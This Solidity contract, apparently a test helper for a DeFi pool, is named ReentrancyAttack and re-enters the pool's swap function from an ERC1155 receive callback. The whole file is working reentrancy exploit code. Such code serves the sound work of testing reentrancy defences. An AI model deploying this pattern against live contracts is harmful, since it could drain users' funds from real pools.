// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import "../PoolBase.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract ReentrancyAttack is ERC1155Holder {
    address internal immutable POOL;
    address internal immutable WETH;
    Param s_param;
    Payment s_payment;

    constructor(address pool, address weth) {
        POOL = pool;
        WETH = weth;
    }

    // the first swap in attack will transfer 1155 token to this contract
    // and trigger this receiver function
    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        // reentrant attack on SIDE_C
        if (id >> 160 == 48) {
            // now, the recipient is tx.origin, so no recusive re-entrancy
            IPool(POOL).swap(s_param, s_payment);
            // successfully attacked
        }
        return this.onERC1155Received.selector;
    }

    function attack(
        uint256 amount,
        Param memory param,
        Payment memory payment
    ) public {
        s_param = param;
        payment.recipient = tx.origin;      // no recursive re-entrant
        s_payment = payment;
        payment.recipient = address(this);  // trigger the onERC1155Received above
        IERC20(WETH).approve(POOL, amount);
        IPool(POOL).swap(param, payment);
    }
}
